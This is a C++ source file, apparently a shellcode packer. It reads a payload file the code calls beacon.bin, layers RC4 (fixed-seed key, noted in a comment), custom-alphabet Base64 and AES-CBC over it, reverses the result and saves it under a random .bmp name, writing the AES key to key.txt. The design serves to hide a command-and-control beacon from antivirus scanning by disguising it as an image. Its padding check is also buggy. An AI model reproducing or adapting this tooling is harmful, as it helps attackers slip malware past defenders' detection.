#define _CRT_SECURE_NO_DEPRECATE

#include <iostream>
#include "AES.h"
#include "Base64.h"
#include <vector>
#include <fstream>
#include <random>

using namespace std;

const char* g_key = "";
const char* g_iv = "gfdertfghjkuyrtg";//ECB MODE不需要关心chain，可以填空
string rc4Key;

string EncryptionAES(const string& strSrc) //AES加密
{
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//明文
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());

	//进行PKCS7Padding填充。
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';

	//加密后的密文
	char* szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);

	//进行进行AES的CBC模式加密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*)szDataOut,
		block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;
}

string DecryptionAES(const string& strSrc) //AES解密
{
	string strData = base64_decode(strSrc);
	size_t length = strData.length();
	//密文
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//明文
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//进行AES的CBC模式解密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//去PKCS7Padding填充
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				cout << "去填充失败！解密出错！！" << endl;
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}

// 自定义的RC4解密算法实现
std::string rc4Decrypt(const std::string& input, const std::string& key) {
	std::vector<unsigned char> S(256);
	for (int i = 0; i < 256; ++i) {
		S[i] = i;
	}

	int j = 0;
	for (int i = 0; i < 256; ++i) {
		j = (j + S[i] + key[i % key.length()]) % 256;
		std::swap(S[i], S[j]);
	}

	int i = 0;
	j = 0;
	std::string output = input;
	for (int k = 0; k < input.length(); ++k) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		std::swap(S[i], S[j]);
		output[k] ^= S[(S[i] + S[j]) % 256];
	}

	return output;
}

std::string rc4Encrypt(const std::string& input, const std::string& key) {
	std::vector<unsigned char> S(256);
	for (int i = 0; i < 256; ++i) {
		S[i] = i;
	}

	int j = 0;
	for (int i = 0; i < 256; ++i) {
		j = (j + S[i] + key[i % key.length()]) % 256;
		std::swap(S[i], S[j]);
	}

	int i = 0;
	j = 0;
	std::string output = input;
	for (int k = 0; k < input.length(); ++k) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		std::swap(S[i], S[j]);
		output[k] ^= S[(S[i] + S[j]) % 256];
	}

	return output;
}


// 自定义的Base64解码实现
std::string base64Decode(const std::string& input) {
	const std::string base64Chars = "i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN";

	std::string output;
	int val = 0;
	int valBits = 0;

	for (const auto& c : input) {
		if (c == '=') {
			break; // 忽略填充字符
		}

		val = (val << 6) | base64Chars.find(c);
		valBits += 6;

		if (valBits >= 8) {
			valBits -= 8;
			output += static_cast<char>((val >> valBits) & 0xFF);
		}
	}
	return output;
}

// 自定义的Base64编码实现
std::string base64Encode(const std::string& input) {
	const std::string base64Chars = "i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN";

	std::string output;
	int val = 0;
	int valBits = 0;

	for (const auto& c : input) {
		val = (val << 8) | static_cast<unsigned char>(c);
		valBits += 8;

		while (valBits >= 6) {
			valBits -= 6;
			output += base64Chars[(val >> valBits) & 0x3F];
		}
	}

	if (valBits > 0) {
		val <<= (6 - valBits);
		output += base64Chars[val & 0x3F];

		int padding = (6 - valBits) / 2;
		for (int i = 0; i < padding; ++i) {
			output += '=';
		}
	}

	return output;
}

std::string generateFixedString(int num) {
	std::string fixedString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

	std::mt19937 generator(num); // 设置相同的种子值
	std::shuffle(fixedString.begin(), fixedString.end(), generator);

	return fixedString.substr(0, 16); // 取前16位作为固定字符串
}

std::string generateRandomString(int length) 
{
	std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	std::string randomString;

	std::srand(std::time(nullptr));  // 初始化随机数生成器

	for (int i = 0; i < length; i++) {
		int randomIndex = std::rand() % charset.length();  // 生成随机索引
		randomString += charset[randomIndex];  // 将随机字符添加到字符串中
	}

	return randomString;
}

int main(int argc,char* argv[])
{
	//Bw4T9mvouk^rlR@A
	string rc4Key = generateFixedString(12468);
	// 读取beacon.bin文件
	ifstream inputFile(argv[1], ios::binary);
	if (!inputFile)
	{
		cout << "Failed to open file: beacon.bin" << endl;
		return 0;
	}

	g_key = argv[2];

	// 获取文件长度
	inputFile.seekg(0, ios::end);
	size_t fileSize = inputFile.tellg();
	inputFile.seekg(0, ios::beg);

	// 读取文件内容
	vector<char> buffer(fileSize);
	inputFile.read(buffer.data(), fileSize);
	inputFile.close();

	string plaintext(buffer.begin(), buffer.end());

	// RC4加密
	string rc4Ciphertext = rc4Encrypt(plaintext, rc4Key);

	// Base64编码
	string base64Ciphertext = base64Encode(rc4Ciphertext);

	// AES加密
	string aesCiphertext = EncryptionAES(base64Ciphertext);
	std::reverse(aesCiphertext.begin(), aesCiphertext.end());

	// 将加密结果保存在随机文件中
	int length = 10;
	std::string randomString = generateRandomString(length) + ".bmp";
	ofstream outputFile(randomString);
	if (!outputFile)
	{
		cout << "Failed to create file" << endl;
		return 0;
	}
	outputFile << aesCiphertext;
	outputFile.close();

	ofstream keyFile("key.txt");
	if (!keyFile)
	{
		cout << "Failed to create file: key.txt" << endl;
		return 0;
	}
	keyFile << g_key;

	
	return 0;
}